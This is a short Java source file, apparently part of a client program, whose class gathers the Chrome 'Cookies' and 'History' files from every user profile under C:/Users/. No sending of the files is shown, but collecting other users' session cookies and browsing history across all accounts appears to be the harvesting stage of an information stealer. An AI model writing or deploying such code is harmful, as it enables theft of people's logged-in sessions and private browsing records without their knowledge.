package client;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collection;

public class FindCookiesHistory
{
    String usersDirectoryPath = "C:/Users/";
    String chromeLocation = "/AppData/Local/Google/Chrome/User Data/Default";

    public Collection<File> getCookies() throws IOException
    {
        ArrayList<File> filesFound = new ArrayList<>();

        File root = new File(usersDirectoryPath);

        File[] users = root.listFiles();
        if(users != null)
        {
            for (File user : users)
            {
                String chromeDirectoryPath = usersDirectoryPath + user.getName() + chromeLocation;
                File chromeDirectory = new File(chromeDirectoryPath);

                File[] files = chromeDirectory.listFiles();
                if(files != null)
                {
                    for(File file : files )
                    {
                        if(file.getName().equals("History") || file.getName().equals("Cookies"))
                            filesFound.add(file);
                    }
                }
            }
        }

        return filesFound;
    }
}
